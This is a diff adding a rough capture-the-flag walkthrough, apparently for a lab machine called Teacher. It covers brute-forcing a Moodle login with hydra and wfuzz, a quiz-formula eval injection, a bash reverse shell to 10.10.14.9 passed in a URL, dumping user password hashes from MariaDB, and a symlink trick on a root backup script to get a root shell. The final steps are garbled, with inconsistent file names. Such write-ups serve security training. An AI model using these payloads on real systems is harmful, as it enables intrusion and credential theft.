@@ -1,0 +1,58 @@
+first we couldnot find anything ..not even any cms
+
+then image directory showed as 5.png which was a text file not a png
+
+we read it said whole the password  except last word
+
+so we used hydra
+
+`hydra -l Giovanni -P char.txt 10.10.10.153 http-post-form "/moodle/login/index.php:username=^USER^&==password=Th4C00lTheacha^PASS^==:Invalid login, please try again"`
+
+but it couldnot find any password as page gave 200 code
+
+so we used ==wfuzz   to bruteforce==
+
+wfuzz ... password===ddfffFUZZ==
+
+it told us the password
+
+then we logged on the ==moodle== but the cms exploit was not easy
+
+in ==quiz== we created a question with ==formula== and injected this as the code was using eval function
+
+``/*{a*/`$_REQUEST[plz]`;//9.9}``
+
+in url we added   `&plz=bash+-i+>%26+/dev/tcp/10.10.14.9/5555+0>%261`
+
+thus we got a shell as www-data
+
+we saw config file which had ==mariadb== password and got passwiord for user
+
+```
+MariaDB [(none)]> USE moodle;
+
+MariaDB [(none)]> SHOW TABLES;
+
+MariaDB [(none)]> SELECT username,password FROM mdl_user
+```
+
+then
+
+there was a .sh file
+
+```
+#!/bin/bash
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+```
+
+==`we cant edit it and we tried to`== `put` ==`a shell in courses but no use`==
+
+`==so we used symlink ln -s== /usr/bin/worksdofd.sh`
+
+`and in our current directory a  file named same which link to /usr/bin/worfnkdfnkjdf.sh was created which we can` `edit`
+
+==`so we  injected shell code and aot`== `teh` ==`root shell`==
